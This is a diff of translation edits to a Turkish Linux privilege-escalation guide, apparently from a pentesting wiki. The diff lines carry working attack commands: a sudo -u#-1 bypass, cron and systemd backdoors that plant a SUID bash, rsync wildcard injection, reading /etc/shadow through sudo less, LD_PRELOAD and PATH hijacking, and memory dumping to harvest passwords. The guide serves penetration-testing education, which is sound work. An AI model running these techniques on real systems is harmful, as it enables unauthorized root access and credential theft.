@@ -14,7 +14,7 @@ cat /etc/os-release 2>/dev/null # universal on modern systems
 ```
 ### Path
 
-Eğer `PATH` değişkeni içindeki herhangi bir klasörde **yazma izinleriniz varsa**, bazı kütüphaneleri veya ikili dosyaları ele geçirebilirsiniz:
+Eğer **`PATH`** değişkeni içindeki herhangi bir klasörde yazma izinleriniz varsa, bazı kütüphaneleri veya ikili dosyaları ele geçirebilirsiniz:
 ```bash
 echo $PATH
 ```
@@ -26,7 +26,7 @@ echo $PATH
 ```
 ### Kernel exploits
 
-Kerneli sürümünü kontrol edin ve ayrıcalıkları artırmak için kullanılabilecek bir exploit olup olmadığını kontrol edin.
+Kerneli sürümünü kontrol edin ve ayrıcalıkları artırmak için kullanılabilecek bir açık olup olmadığını kontrol edin.
 ```bash
 cat /proc/version
 uname -a
@@ -35,11 +35,11 @@ searchsploit "Linux Kernel"
 İyi bir savunmasız çekirdek listesi ve bazı **derlenmiş istismarlar** burada bulunabilir: [https://github.com/lucyoa/kernel-exploits](https://github.com/lucyoa/kernel-exploits) ve [exploitdb sploits](https://github.com/offensive-security/exploitdb-bin-sploits/tree/master/bin-sploits).\
 Bazı **derlenmiş istismarlar** bulabileceğiniz diğer siteler: [https://github.com/bwbwbwbw/linux-exploit-binaries](https://github.com/bwbwbwbw/linux-exploit-binaries), [https://github.com/Kabot/Unix-Privilege-Escalation-Exploits-Pack](https://github.com/Kabot/Unix-Privilege-Escalation-Exploits-Pack)
 
-O web sitesinden tüm savunmasız çekirdek sürümlerini çıkarmak için şunu yapabilirsiniz:
+O web sitesinden tüm savunmasız çekirdek sürümlerini çıkarmak için şunları yapabilirsiniz:
 ```bash
 curl https://raw.githubusercontent.com/lucyoa/kernel-exploits/master/README.md 2>/dev/null | grep "Kernels: " | cut -d ":" -f 2 | cut -d "<" -f 1 | tr -d "," | tr ' ' '\n' | grep -v "^\d\.\d$" | sort -u -r | tr '\n' ' '
 ```
-Kerneli açıklarını aramak için yardımcı olabilecek araçlar şunlardır:
+Kerneli açıklarını aramaya yardımcı olabilecek araçlar şunlardır:
 
 [linux-exploit-suggester.sh](https://github.com/mzet-/linux-exploit-suggester)\
 [linux-exploit-suggester2.pl](https://github.com/jondonas/linux-exploit-suggester-2)\
@@ -59,7 +59,7 @@ https://github.com/evait-security/ClickNRoot/blob/master/1/exploit.c
 ```
 ### Sudo sürümü
 
-Göründüğü üzere, savunmasız sudo sürümleri:
+Görünüşteki savunmasız sudo sürümlerine dayanarak:
 ```bash
 searchsploit sudo
 ```
@@ -69,7 +69,7 @@ sudo -V | grep "Sudo ver" | grep "1\.[01234567]\.[0-9]\+\|1\.8\.1[0-9]\*\|1\.8\.
 ```
 #### sudo < v1.28
 
-From @sickrov
+@Sickrov'dan
 ```
 sudo -u#-1 /bin/bash
 ```
@@ -138,9 +138,9 @@ cat /etc/fstab 2>/dev/null | grep -v "^#" | grep -Pv "\W*\#" 2>/dev/null
 #Check if credentials in fstab
 grep -E "(user|username|login|pass|password|pw|credentials)[=:]" /etc/fstab /etc/mtab 2>/dev/null
 ```
-## Yararlı yazılımlar
+## Kullanışlı yazılımlar
 
-Yararlı ikili dosyaları listeleyin
+Kullanışlı ikili dosyaları listeleyin
 ```bash
 which nmap aws nc ncat netcat nc.traditional wget curl ping gcc g++ make gdb base64 socat python python2 python3 python2.7 python2.6 python3.6 python3.7 perl php ruby xterm doas sudo fetch docker lxc ctr runc rkt kubectl 2>/dev/null
 ```
@@ -160,22 +160,22 @@ Eğer makineye SSH erişiminiz varsa, makine içinde yüklü olan eski ve savunm
 
 > [!NOTE] > _Bu komutların çoğunlukla işe yaramayacak çok fazla bilgi göstereceğini unutmayın, bu nedenle yüklü yazılım sürümlerinin bilinen açıklar için savunmasız olup olmadığını kontrol edecek OpenVAS veya benzeri bazı uygulamaların kullanılması önerilir._
 
-## İşlemler
+## Süreçler
 
-**Hangi işlemlerin** çalıştığına bakın ve herhangi bir işlemin **gerektiğinden daha fazla ayrıcalığa** sahip olup olmadığını kontrol edin (belki root tarafından çalıştırılan bir tomcat?).
+**Hangi süreçlerin** çalıştığına bir göz atın ve herhangi bir sürecin **gerektiğinden daha fazla ayrıcalığa** sahip olup olmadığını kontrol edin (belki root tarafından çalıştırılan bir tomcat?).
 ```bash
 ps aux
 ps -ef
 top -n 1
 ```
-Her zaman [**electron/cef/chromium debuggers**'ın çalışıp çalışmadığını kontrol edin, bunu yetkileri artırmak için kötüye kullanabilirsiniz](electron-cef-chromium-debugger-abuse.md). **Linpeas**, sürecin komut satırında `--inspect` parametresini kontrol ederek bunları tespit eder.\
+Her zaman mümkün olan [**electron/cef/chromium debuggers**'ın çalışıp çalışmadığını kontrol edin, bunu yetkileri artırmak için kötüye kullanabilirsiniz](electron-cef-chromium-debugger-abuse.md). **Linpeas**, sürecin komut satırında `--inspect` parametresini kontrol ederek bunları tespit eder.\
 Ayrıca **işlemlerin ikili dosyaları üzerindeki yetkilerinizi kontrol edin**, belki birinin üzerine yazabilirsiniz.
 
-### İşlem izleme
+### Süreç izleme
 
-[**pspy**](https://github.com/DominicBreuker/pspy) gibi araçları kullanarak işlemleri izleyebilirsiniz. Bu, sıkça yürütülen veya belirli bir gereksinim seti karşılandığında zayıf süreçleri tanımlamak için çok yararlı olabilir.
+[**pspy**](https://github.com/DominicBreuker/pspy) gibi araçları kullanarak süreçleri izleyebilirsiniz. Bu, sıkça yürütülen veya belirli bir gereksinim seti karşılandığında zayıf süreçleri tanımlamak için çok yararlı olabilir.
 
-### İşlem belleği
+### Süreç belleği
 
 Bir sunucunun bazı hizmetleri **şifreleri açık metin olarak bellekte saklar**.\
 Genellikle, diğer kullanıcılara ait süreçlerin belleğini okumak için **root yetkilerine** ihtiyacınız olacaktır, bu nedenle bu genellikle zaten root olduğunuzda ve daha fazla kimlik bilgisi keşfetmek istediğinizde daha faydalıdır.\
@@ -189,7 +189,7 @@ Ancak, **normal bir kullanıcı olarak sahip olduğunuz süreçlerin belleğini 
 > - **kernel.yama.ptrace_scope = 0**: tüm süreçler, aynı uid'ye sahip oldukları sürece hata ayıklanabilir. Bu, ptracing'in klasik çalışma şeklidir.
 > - **kernel.yama.ptrace_scope = 1**: yalnızca bir ana süreç hata ayıklanabilir.
 > - **kernel.yama.ptrace_scope = 2**: Yalnızca yönetici ptrace kullanabilir, çünkü bu CAP_SYS_PTRACE yeteneğini gerektirir.
-> - **kernel.yama.ptrace_scope = 3**: Hiçbir süreç ptrace ile izlenemez. Ayarlandıktan sonra, ptracing'i tekrar etkinleştirmek için bir yeniden başlatma gerekir.
+> - **kernel.yama.ptrace_scope = 3**: Hiçbir süreç ptrace ile izlenemez. Ayarlandıktan sonra, ptracing'i tekrar etkinleştirmek için yeniden başlatma gereklidir.
 
 #### GDB
 
@@ -215,7 +215,7 @@ done
 ```
 #### /proc/$pid/maps & /proc/$pid/mem
 
-Verilen bir işlem kimliği için, **maps o işlemin** sanal adres alanında belleğin nasıl haritalandığını gösterir; ayrıca **her haritalanmış bölgenin izinlerini** de gösterir. **mem** sanal dosyası **işlemin belleğini** kendisi açığa çıkarır. **maps** dosyasından hangi **bellek bölgelerinin okunabilir olduğunu** ve bunların ofsetlerini biliyoruz. Bu bilgiyi **mem dosyasına erişmek ve tüm okunabilir bölgeleri** bir dosyaya dökmek için kullanıyoruz.
+Verilen bir işlem kimliği için, **maps o işlemin** sanal adres alanında belleğin nasıl haritalandığını gösterir; ayrıca **her haritalanmış bölgenin izinlerini** de gösterir. **mem** sanal dosyası **işlemlerin belleğini** kendisi açığa çıkarır. **maps** dosyasından hangi **bellek bölgelerinin okunabilir olduğunu** ve bunların ofsetlerini biliyoruz. Bu bilgiyi **mem dosyasına erişmek ve tüm okunabilir bölgeleri** bir dosyaya dökmek için kullanıyoruz.
 ```bash
 procdump()
 (
@@ -281,7 +281,7 @@ Eğer doğrulayıcı işlemin çalıştığını bulursanız:
 ps -ef | grep "authenticator"
 root      2027  2025  0 11:46 ?        00:00:00 authenticator
 ```
-Bir süreci dökebilirsiniz (bir sürecin belleğini dökmenin farklı yollarını bulmak için önceki bölümlere bakın) ve bellekte kimlik bilgilerini arayabilirsiniz:
+Süreci dökebilirsiniz (bir sürecin belleğini dökmenin farklı yollarını bulmak için önceki bölümlere bakın) ve belleğin içinde kimlik bilgilerini arayabilirsiniz:
 ```bash
 ./dump-memory.sh 2027
 strings *.dump | grep -i password
@@ -315,7 +315,7 @@ Reading symbols from /lib/x86_64-linux-gnu/librt.so.1...
 ```
 ## Zamanlanmış/Cron görevleri
 
-Herhangi bir zamanlanmış görevin savunmasız olup olmadığını kontrol edin. Belki root tarafından yürütülen bir scriptten faydalanabilirsiniz (wildcard vuln? root'un kullandığı dosyaları değiştirebilir mi? symlink'ler kullanabilir mi? root'un kullandığı dizinde belirli dosyalar oluşturabilir mi?).
+Herhangi bir zamanlanmış görevin zayıf olup olmadığını kontrol edin. Belki root tarafından yürütülen bir scriptten faydalanabilirsiniz (wildcard zayıflığı mı? root'un kullandığı dosyaları değiştirebilir mi? symlink'ler kullanabilir mi? root'un kullandığı dizinde belirli dosyalar oluşturabilir mi?).
 ```bash
 crontab -l
 ls -al /etc/cron* /etc/at*
@@ -327,16 +327,16 @@ cat /etc/cron* /etc/at* /etc/anacrontab /var/spool/cron/crontabs/root 2>/dev/nul
 
 (_Kullanıcı "user"ın /home/user üzerinde yazma ayrıcalıklarına sahip olduğunu not edin_)
 
-Eğer bu crontab içinde root kullanıcısı bir komut veya scripti yolu ayarlamadan çalıştırmaya çalışırsa. Örneğin: _\* \* \* \* root overwrite.sh_\
+Eğer bu crontab içinde root kullanıcısı yolu ayarlamadan bazı komut veya betikler çalıştırmaya çalışırsa. Örneğin: _\* \* \* \* root overwrite.sh_\
 O zaman, şunu kullanarak bir root shell elde edebilirsiniz:
 ```bash
 echo 'cp /bin/bash /tmp/bash; chmod +s /tmp/bash' > /home/user/overwrite.sh
 #Wait cron job to be executed
 /tmp/bash -p #The effective uid and gid to be set to the real uid and gid
 ```
-### Cron, bir joker karakter ile bir script kullanma (Joker Karakter Enjeksiyonu)
+### Cron bir joker karakter ile bir script kullanma (Joker Karakter Enjeksiyonu)
 
-Eğer root tarafından yürütülen bir script bir komutun içinde “**\***” içeriyorsa, bunu beklenmedik şeyler yapmak için kullanabilirsiniz (örneğin, privesc). Örnek:
+Eğer root tarafından yürütülen bir script bir komutun içinde “**\***” içeriyorsa, bunu beklenmedik şeyler (örneğin privesc) yapmak için kullanabilirsiniz. Örnek:
 ```bash
 rsync -a *.sh rsync://host.back/src/rbd #You can create a file called "-e sh myscript.sh" so the script will execute our script
 ```
@@ -356,7 +356,7 @@ echo 'cp /bin/bash /tmp/bash; chmod +s /tmp/bash' > </PATH/CRON/SCRIPT>
 #Wait until it is executed
 /tmp/bash -p
 ```
-Eğer root tarafından yürütülen script, **tam erişiminiz olan bir dizini** kullanıyorsa, belki de o klasörü silmek ve **kontrolünüzdeki bir script'i hizmet eden başka birine symlink klasörü oluşturmak** faydalı olabilir.
+Eğer root tarafından yürütülen script, **tam erişiminizin olduğu bir dizin kullanıyorsa**, belki de o klasörü silmek ve **kontrolünüzdeki bir script'i hizmet eden başka birine symlink klasörü oluşturmak** faydalı olabilir.
 ```bash
 ln -d -s </PATH/TO/POINT> </PATH/CREATE/FOLDER>
 ```
@@ -372,7 +372,7 @@ for i in $(seq 1 610); do ps -e --format cmd >> /tmp/monprocs.tmp; sleep 0.1; do
 
 ### Görünmez cron işleri
 
-Bir cron işi **bir yorumdan sonra bir satır sonu karakteri olmadan bir taşıyıcı dönüş koyarak** oluşturmak mümkündür ve cron işi çalışacaktır. Örnek (taşıyıcı dönüş karakterine dikkat edin):
+Bir cron işi **bir yorumdan sonra bir satır sonu karakteri olmadan bir satır sonu ekleyerek** oluşturmak mümkündür ve cron işi çalışacaktır. Örnek (satır sonu karakterine dikkat edin):
 ```bash
 #This is a comment inside a cron config file\r* * * * * echo "Surprise!"
 ```
@@ -380,32 +380,32 @@ Bir cron işi **bir yorumdan sonra bir satır sonu karakteri olmadan bir taşıy
 
 ### Yazılabilir _.service_ dosyaları
 
-Herhangi bir `.service` dosyasını yazıp yazamayacağınızı kontrol edin, eğer yazabiliyorsanız, bunu **değiştirerek** hizmet başlatıldığında, yeniden başlatıldığında veya durdurulduğunda **arka kapınızı çalıştıracak** şekilde ayarlayabilirsiniz (belki makinenin yeniden başlatılmasını beklemeniz gerekecek).\
+Herhangi bir `.service` dosyasını yazıp yazamayacağınızı kontrol edin, eğer yazabiliyorsanız, onu **değiştirip** hizmet **başlatıldığında**, **yeniden başlatıldığında** veya **durdurulduğunda** **arka kapınızı çalıştıracak** şekilde **ayarlayabilirsiniz** (belki makinenin yeniden başlatılmasını beklemeniz gerekecek).\
 Örneğin, arka kapınızı .service dosyasının içine **`ExecStart=/tmp/script.sh`** ile oluşturun.
 
 ### Yazılabilir hizmet ikili dosyaları
 
-Hizmetler tarafından yürütülen ikili dosyalar üzerinde **yazma izinleriniz varsa**, bunları arka kapılarla değiştirebileceğinizi unutmayın, böylece hizmetler yeniden yürütüldüğünde arka kapılar çalıştırılacaktır.
+Eğer hizmetler tarafından yürütülen ikili dosyalar üzerinde **yazma izinleriniz varsa**, bunları arka kapılarla değiştirebilirsiniz, böylece hizmetler yeniden yürütüldüğünde arka kapılar çalıştırılacaktır.
 
 ### systemd PATH - Göreli Yollar
 
-**systemd** tarafından kullanılan PATH'i şu şekilde görebilirsiniz:
+**systemd** tarafından kullanılan PATH'i görebilirsiniz:
 ```bash
 systemctl show-environment
 ```
-Eğer yolun herhangi bir klasöründe **yazma** yetkiniz olduğunu bulursanız, **yetkileri yükseltebilirsiniz**. **Hizmet yapılandırma** dosyalarında kullanılan **göreli yolları** aramanız gerekiyor, örneğin:
+Eğer yolun herhangi bir klasöründe **yazma** yetkiniz olduğunu bulursanız, **yetkileri artırma** şansınız olabilir. **Hizmet yapılandırma** dosyalarında kullanılan **göreli yolları** aramanız gerekiyor, örneğin:
 ```bash
 ExecStart=faraday-server
 ExecStart=/bin/sh -ec 'ifup --allow=hotplug %I; ifquery --state %I'
 ExecStop=/bin/sh "uptux-vuln-bin3 -stuff -hello"
 ```
-Sonra, yazabileceğiniz systemd PATH klasörü içinde **göreli yol ikili dosyasıyla aynı isme sahip bir **çalıştırılabilir** dosya oluşturun ve hizmetten savunmasız eylemi (**Başlat**, **Durdur**, **Yenile**) gerçekleştirmesi istendiğinde, **arka kapınız çalıştırılacaktır** (yetkisiz kullanıcılar genellikle hizmetleri başlatamaz/durduramaz, ancak `sudo -l` kullanıp kullanamayacağınızı kontrol edin).
+Sonra, yazabileceğiniz systemd PATH klasörü içinde **göreli yol ikili dosyasıyla aynı isme sahip bir **çalıştırılabilir** dosya oluşturun ve hizmet, savunmasız eylemi (**Başlat**, **Durdur**, **Yenile**) gerçekleştirmesi istendiğinde, **arka kapınız çalıştırılacaktır** (yetkisiz kullanıcılar genellikle hizmetleri başlatamaz/durduramaz, ancak `sudo -l` kullanıp kullanamayacağınızı kontrol edin).
 
 **Hizmetler hakkında daha fazla bilgi edinin: `man systemd.service`.**
 
 ## **Zamanlayıcılar**
 
-**Zamanlayıcılar**, `**.service**` dosyalarını veya olayları kontrol eden `**.timer**` ile biten systemd birim dosyalarıdır. **Zamanlayıcılar**, takvim zamanı olayları ve monotonik zaman olayları için yerleşik destekleri olduğundan, cron'a alternatif olarak kullanılabilir ve asenkron olarak çalıştırılabilir.
+**Zamanlayıcılar**, `**.service**` dosyalarını veya olayları kontrol eden `**.timer**` ile biten systemd birim dosyalarıdır. **Zamanlayıcılar**, takvim zamanı olayları ve monotonik zaman olayları için yerleşik destekleri olduğundan, cron'a alternatif olarak kullanılabilir ve asenkron olarak çalıştırılabilirler.
 
 Tüm zamanlayıcıları şu şekilde listeleyebilirsiniz:
 ```bash
@@ -417,14 +417,14 @@ Eğer bir zamanlayıcıyı değiştirebiliyorsanız, onu bazı systemd.unit varl
 ```bash
 Unit=backdoor.service
 ```
-Belgede birimin ne olduğunu okuyabilirsiniz:
+Belgede, bir Birimin ne olduğunu okuyabilirsiniz:
 
-> Bu zamanlayıcı süresi dolduğunda etkinleştirilecek birim. Argüman, ".timer" ile bitmeyen bir birim adıdır. Belirtilmezse, bu değer, zamanlayıcı birimi ile aynı ada sahip bir hizmete varsayılan olarak ayarlanır, yalnızca sonek hariç. (Yukarıya bakın.) Etkinleştirilen birim adı ile zamanlayıcı birimi adı, sonek hariç aynı şekilde adlandırılması önerilir.
+> Bu zamanlayıcı süresi dolduğunda etkinleştirilecek birim. Argüman, ".timer" ile bitmeyen bir birim adıdır. Belirtilmezse, bu değer, zamanlayıcı birimi ile aynı ada sahip bir hizmete varsayılan olarak ayarlanır, sadece son ek hariç. (Yukarıya bakın.) Etkinleştirilen birim adı ile zamanlayıcı birimi adı, son ek hariç aynı şekilde adlandırılması önerilir.
 
 Bu nedenle, bu izni kötüye kullanmak için şunları yapmanız gerekir:
 
-- **yazılabilir bir ikili dosya** çalıştıran bazı systemd birimlerini bulun (örneğin bir `.service`)
-- **göreli bir yolu** çalıştıran bazı systemd birimlerini bulun ve **systemd PATH** üzerinde **yazma ayrıcalıklarınız** olsun (o yürütülebilir dosyayı taklit etmek için)
+- **yazılabilir bir ikili dosya** çalıştıran bir systemd birimi (örneğin bir `.service`) bulun
+- **göreli bir yolu** çalıştıran bir systemd birimi bulun ve **systemd PATH** üzerinde **yazma ayrıcalıklarınız** olsun (o yürütülebilir dosyayı taklit etmek için)
 
 **Zamanlayıcılar hakkında daha fazla bilgi edinin `man systemd.timer`.**
 
@@ -439,7 +439,7 @@ Not edin ki **zamanlayıcı**, `/etc/systemd/system/<WantedBy_section>.wants/<na
 
 ## Soketler
 
-Unix Domain Sockets (UDS), **işlem iletişimi** için aynı veya farklı makinelerde istemci-sunucu modelleri içinde olanak tanır. Standart Unix tanımlayıcı dosyalarını kullanarak bilgisayarlar arası iletişim sağlarlar ve `.socket` dosyaları aracılığıyla yapılandırılırlar.
+Unix Domain Sockets (UDS), **işlem iletişimi** için aynı veya farklı makinelerde istemci-sunucu modelleri içinde olanak tanır. Standart Unix tanımlayıcı dosyalarını kullanarak bilgisayarlar arası iletişim sağlar ve `.socket` dosyaları aracılığıyla yapılandırılır.
 
 Soketler, `.socket` dosyaları kullanılarak yapılandırılabilir.
 
@@ -453,14 +453,14 @@ Soketler, `.socket` dosyaları kullanılarak yapılandırılabilir.
 
 ### Yazılabilir .socket dosyaları
 
-Eğer **yazılabilir** bir `.socket` dosyası bulursanız, `[Socket]` bölümünün başına şunu ekleyebilirsiniz: `ExecStartPre=/home/kali/sys/backdoor` ve arka kapı soket oluşturulmadan önce çalıştırılacaktır. Bu nedenle, **muhtemelen makinenin yeniden başlatılmasını beklemeniz gerekecek.**\
-&#xNAN;_&#x4E;ote edin ki sistemin bu soket dosyası yapılandırmasını kullanıyor olması gerekir, aksi takdirde arka kapı çalıştırılmayacaktır._
+Eğer bir **yazılabilir** `.socket` dosyası bulursanız, `[Socket]` bölümünün başına şunu ekleyebilirsiniz: `ExecStartPre=/home/kali/sys/backdoor` ve arka kapı soket oluşturulmadan önce çalıştırılacaktır. Bu nedenle, **muhtemelen makinenin yeniden başlatılmasını beklemeniz gerekecek.**\
+&#xNAN;_&#x4E;ote that the system must be using that socket file configuration or the backdoor won't be executed_
 
 ### Yazılabilir soketler
 
-Eğer **herhangi bir yazılabilir soket** tespit ederseniz (_şimdi Unix Soketleri hakkında konuşuyoruz ve yapılandırma `.socket` dosyaları hakkında değiliz_), o zaman **bu soketle iletişim kurabilirsiniz** ve belki bir açığı istismar edebilirsiniz.
+Eğer **herhangi bir yazılabilir soket** (_şimdi Unix Soketlerinden bahsediyoruz ve yapılandırma `.socket` dosyalarından değil_), o zaman **bu soketle iletişim kurabilirsiniz** ve belki bir açığı istismar edebilirsiniz.
 
-### Unix Soketlerini Listele
+### Unix Soketlerini Sayma
 ```bash
 netstat -a -p --unix
 ```
@@ -536,7 +536,7 @@ Upgrade: tcp
 
 ### Diğerleri
 
-Eğer **`docker` grubunun içinde olduğunuz için** docker soketi üzerinde yazma izinleriniz varsa, [**yetki yükseltmek için daha fazla yolunuz vardır**](interesting-groups-linux-pe/#docker-group). Eğer [**docker API bir portta dinliyorsa, onu tehlikeye atma şansınız da olabilir**](../../network-services-pentesting/2375-pentesting-docker.md#compromising).
+Eğer **`docker` grubunun içinde** olduğunuz için docker soketi üzerinde yazma izinleriniz varsa, [**yetki yükseltmek için daha fazla yolunuz vardır**](interesting-groups-linux-pe/#docker-group). Eğer [**docker API bir portta dinliyorsa, onu tehlikeye atma şansınız da olabilir**](../../network-services-pentesting/2375-pentesting-docker.md#compromising).
 
 **Docker'dan çıkmanın veya onu kötüye kullanarak yetki yükseltmenin daha fazla yolunu** kontrol edin:
 
@@ -564,13 +564,13 @@ runc-privilege-escalation.md
 
 D-Bus, uygulamaların verimli bir şekilde etkileşimde bulunmasını ve veri paylaşmasını sağlayan karmaşık bir **İşlem Arası İletişim (IPC) sistemi**dir. Modern Linux sistemini göz önünde bulundurarak tasarlanmış olup, farklı uygulama iletişim biçimleri için sağlam bir çerçeve sunar.
 
-Sistem çok yönlüdür, süreçler arasında veri alışverişini artıran temel IPC'yi destekler ve **gelişmiş UNIX alan soketleri**ni andırır. Ayrıca, olayları veya sinyalleri yayınlamaya yardımcı olarak sistem bileşenleri arasında sorunsuz entegrasyonu teşvik eder. Örneğin, bir Bluetooth daemon'undan gelen bir çağrı sinyali, bir müzik çalarının sessize geçmesini sağlayabilir ve kullanıcı deneyimini artırabilir. Ayrıca, D-Bus, uygulamalar arasında hizmet taleplerini ve yöntem çağrılarını basitleştiren bir uzak nesne sistemi destekler ve geleneksel olarak karmaşık olan süreçleri kolaylaştırır.
+Sistem, süreçler arasında veri alışverişini artıran temel IPC'yi destekleyerek **gelişmiş UNIX alan soketleri**ni andıran bir yapıdadır. Ayrıca, olayları veya sinyalleri yayınlamaya yardımcı olarak sistem bileşenleri arasında sorunsuz bir entegrasyonu teşvik eder. Örneğin, bir Bluetooth daemon'undan gelen bir çağrı sinyali, bir müzik çalarını sessize alabilir ve kullanıcı deneyimini artırabilir. Ayrıca, D-Bus, uygulamalar arasında hizmet taleplerini ve yöntem çağrılarını basitleştiren bir uzak nesne sistemi destekler ve geleneksel olarak karmaşık olan süreçleri kolaylaştırır.
 
 D-Bus, mesaj izinlerini (yöntem çağrıları, sinyal yayma vb.) toplu olarak eşleşen politika kurallarının etkisine göre yöneten bir **izin/verme modeli** üzerinde çalışır. Bu politikalar, otobüsle etkileşimleri belirler ve bu izinlerin istismar edilmesi yoluyla yetki yükseltmeye olanak tanıyabilir.
 
-`/etc/dbus-1/system.d/wpa_supplicant.conf` dosyasında, root kullanıcısının `fi.w1.wpa_supplicant1`'den mesaj alması, göndermesi ve sahip olması için izinleri detaylandıran bir politika örneği sağlanmıştır.
+`/etc/dbus-1/system.d/wpa_supplicant.conf` dosyasında, root kullanıcısının `fi.w1.wpa_supplicant1`'e mesaj göndermesi, alması ve sahip olması için izinleri detaylandıran bir politika örneği sağlanmıştır.
 
-Belirtilmiş bir kullanıcı veya grup içermeyen politikalar evrensel olarak uygulanır, "varsayılan" bağlam politikaları ise diğer belirli politikalarla kapsanmayan tüm durumlara uygulanır.
+Belirtilmiş bir kullanıcı veya grup içermeyen politikalar evrensel olarak uygulanırken, "varsayılan" bağlam politikaları, diğer belirli politikalarla kapsanmayan tüm durumlara uygulanır.
 ```xml
 <policy user="root">
 <allow own="fi.w1.wpa_supplicant1"/>
@@ -579,7 +579,7 @@ Belirtilmiş bir kullanıcı veya grup içermeyen politikalar evrensel olarak uy
 <allow receive_sender="fi.w1.wpa_supplicant1" receive_type="signal"/>
 </policy>
 ```
-**D-Bus iletişimini nasıl sayacağınızı ve istismar edeceğinizi burada öğrenin:**
+**D-Bus iletişimini nasıl sayılacağını ve istismar edileceğini burada öğrenin:**
 
 {{#ref}}
 d-bus-enumeration-and-command-injection-privilege-escalation.md
@@ -658,7 +658,7 @@ Bazı Linux sürümleri, **UID > INT_MAX** olan kullanıcıların ayrıcalıklar
 
 ### Gruplar
 
-Kök ayrıcalıkları verebilecek **bir grubun üyesi olup olmadığınızı** kontrol edin:
+Sana root ayrıcalıkları verebilecek **bir grubun üyesi olup olmadığını kontrol et**:
 
 {{#ref}}
 interesting-groups-linux-pe/
@@ -666,7 +666,7 @@ interesting-groups-linux-pe/
 
 ### Panoya
 
-Panoda (mümkünse) ilginç bir şey olup olmadığını kontrol edin.
+Panoda (mümkünse) ilginç bir şey olup olmadığını kontrol et.
 ```bash
 if [ `which xclip 2>/dev/null` ]; then
 echo "Clipboard: "`xclip -o -selection clipboard 2>/dev/null`
@@ -683,7 +683,7 @@ grep "^PASS_MAX_DAYS\|^PASS_MIN_DAYS\|^PASS_WARN_AGE\|^ENCRYPT_METHOD" /etc/logi
 ```
 ### Bilinen şifreler
 
-Eğer **ortamın herhangi bir şifresini biliyorsanız**, şifreyi kullanarak **her bir kullanıcı olarak giriş yapmayı deneyin**.
+Eğer **ortamın herhangi bir şifresini biliyorsanız**, şifreyi kullanarak **her kullanıcı olarak giriş yapmayı deneyin**.
 
 ### Su Brute
 
@@ -738,7 +738,7 @@ sudo PYTHONPATH=/dev/shm/ /opt/scripts/admin_tasks.sh
 ```
 ### Sudo yürütme atlama yolları
 
-**Diğer dosyaları okumak için atlayın** veya **sembolik bağlantılar** kullanın. Örneğin sudoers dosyasında: _hacker10 ALL= (root) /bin/less /var/log/\*_
+**Diğer dosyaları okumak** veya **sembolik bağlantılar** kullanmak için atlayın. Örneğin sudoers dosyasında: _hacker10 ALL= (root) /bin/less /var/log/\*_
 ```bash
 sudo less /var/logs/anything
 less>:e /etc/shadow #Jump to read other files using privileged less
@@ -757,7 +757,7 @@ sudo less /var/log/something /etc/shadow #Red 2 files
 
 ### Sudo komutu/SUID ikili dosyası komut yolu olmadan
 
-Eğer **sudo izni** tek bir komuta **yol belirtilmeden** verilmişse: _hacker10 ALL= (root) less_ bunu PATH değişkenini değiştirerek istismar edebilirsiniz.
+Eğer **sudo izni** tek bir komuta **yol belirtilmeden** verilmişse: _hacker10 ALL= (root) less_ PATH değişkenini değiştirerek bunu istismar edebilirsiniz.
 ```bash
 export PATH=/tmp:$PATH
 #Put your backdoor in /tmp and name it "less"
@@ -785,9 +785,9 @@ Sonra, suid ikili dosyasını çağırdığınızda, bu fonksiyon çalıştırı
 Ancak, sistem güvenliğini korumak ve bu özelliğin kötüye kullanılmasını önlemek için, özellikle **suid/sgid** yürütülebilir dosyalarla ilgili olarak, sistem belirli koşulları zorunlu kılar:
 
 - Yükleyici, gerçek kullanıcı kimliği (_ruid_) etkili kullanıcı kimliği (_euid_) ile eşleşmeyen yürütülebilir dosyalar için **LD_PRELOAD**'u dikkate almaz.
-- suid/sgid olan yürütülebilir dosyalar için yalnızca standart yollardaki ve aynı zamanda suid/sgid olan kütüphaneler ön yüklenir.
+- SUID/SGID'ye sahip yürütülebilir dosyalar için yalnızca standart yollardaki ve aynı zamanda suid/sgid olan kütüphaneler ön yüklenir.
 
-Yetki yükseltmesi, `sudo` ile komutları çalıştırma yeteneğiniz varsa ve `sudo -l` çıktısı **env_keep+=LD_PRELOAD** ifadesini içeriyorsa gerçekleşebilir. Bu yapılandırma, **LD_PRELOAD** ortam değişkeninin kalıcı olmasını ve `sudo` ile komutlar çalıştırıldığında tanınmasını sağlar, bu da potansiyel olarak yükseltilmiş ayrıcalıklarla rastgele kodun çalıştırılmasına yol açabilir.
+Yetki yükseltme, `sudo` ile komutları çalıştırma yeteneğiniz varsa ve `sudo -l` çıktısı **env_keep+=LD_PRELOAD** ifadesini içeriyorsa gerçekleşebilir. Bu yapılandırma, **LD_PRELOAD** ortam değişkeninin kalıcı olmasını ve `sudo` ile komutlar çalıştırıldığında tanınmasını sağlar, bu da potansiyel olarak yükseltilmiş ayrıcalıklarla rastgele kodun çalıştırılmasına yol açabilir.
 ```
 Defaults        env_keep += LD_PRELOAD
 ```
@@ -916,7 +916,7 @@ Eğer **sudo erişiminiz** varsa ama şifreniz yoksa, **bir sudo komutunun yür�
 Ayrıcalıkları yükseltmek için gereksinimler:
 
 - Zaten "_sampleuser_" kullanıcısı olarak bir shell'e sahipsiniz
-- "_sampleuser_" son **15 dakikada** bir şeyi yürütmek için **`sudo` kullanmış** (varsayılan olarak bu, `sudo`'yu herhangi bir şifre girmeden kullanmamıza izin veren sudo token'ının süresidir)
+- "_sampleuser_" son **15 dakikada** bir şeyi **`sudo` ile** yürütmüş (varsayılan olarak bu, `sudo`'yu herhangi bir şifre girmeden kullanmamıza izin veren sudo token'ının süresidir)
 - `cat /proc/sys/kernel/yama/ptrace_scope` 0
 - `gdb` erişilebilir (yükleyebilmeniz gerekir)
 
@@ -924,7 +924,7 @@ Ayrıcalıkları yükseltmek için gereksinimler:
 
 Tüm bu gereksinimler karşılandığında, **şu şekilde ayrıcalıkları yükseltebilirsiniz:** [**https://github.com/nongiach/sudo_inject**](https://github.com/nongiach/sudo_inject)
 
-- **ilk istismar** (`exploit.sh`) _/tmp_ dizininde `activate_sudo_token` adlı ikili dosyayı oluşturacaktır. Bunu **oturumunuzda sudo token'ını etkinleştirmek için** kullanabilirsiniz (otomatik olarak bir root shell almayacaksınız, `sudo su` yapın):
+- **ilk istismar** (`exploit.sh`) _/tmp_ dizininde `activate_sudo_token` ikili dosyasını oluşturacaktır. Bunu **oturumunuzda sudo token'ını etkinleştirmek için** kullanabilirsiniz (otomatik olarak bir root shell almayacaksınız, `sudo su` yapın):
 ```bash
 bash exploit.sh
 /tmp/activate_sudo_token
